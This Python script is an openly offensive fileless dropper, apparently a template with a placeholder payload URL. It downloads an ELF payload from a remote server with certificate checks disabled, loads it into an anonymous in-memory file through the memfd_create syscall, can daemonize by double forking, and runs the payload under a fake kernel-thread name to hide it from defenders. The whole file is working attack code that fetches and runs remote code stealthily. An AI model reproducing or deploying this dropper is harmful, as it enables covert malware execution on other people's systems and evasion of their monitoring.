#!/usr/bin/env python3
import ctypes
import os
import ssl
import urllib.request

# credits:
# https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# https://0x00sec.org/t/super-stealthy-droppers/3715/9
# https://blog.fbkcs.ru/elf-in-memory-execution/

# payload source, e.g. http://localhost/payload.elf
PAYLOAD_URL = '§SRVURL§'

# fork to background
DAEMONIZE = False

# disguise as kernel process
MEMFD_NAME = '1'
PROCESS_NAME = '[kworker/u9:0]'

# ---

assert os.name == 'posix'

# from /usr/include/linux/memfd.h
MFD_CLOEXEC = 0x0001

# from /usr/include/asm/unistd_64.h and /usr/include/asm/unistd_32.h
SYSCALL_MAP = dict(
    x86_64=319,
    i386=279,
    arm64=385,
)

# detect architecture
try:
    NR_MEMFD_CREATE = SYSCALL_MAP[os.uname().machine]
except KeyError:
    exit(1)

# call memfd_create(name, flags)
fd = ctypes.CDLL(None).syscall(NR_MEMFD_CREATE, MEMFD_NAME, MFD_CLOEXEC)

# download without checking https certificates
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with urllib.request.urlopen(PAYLOAD_URL, context=ctx) as res:
    os.write(fd, res.read())

if DAEMONIZE:
    # double fork
    pid = os.fork()
    if pid != 0:
        exit()
    os.setsid()
    pid = os.fork()
    if pid != 0:
        exit()

# execute payload
os.execl('/proc/self/fd/{}'.format(fd), PROCESS_NAME)
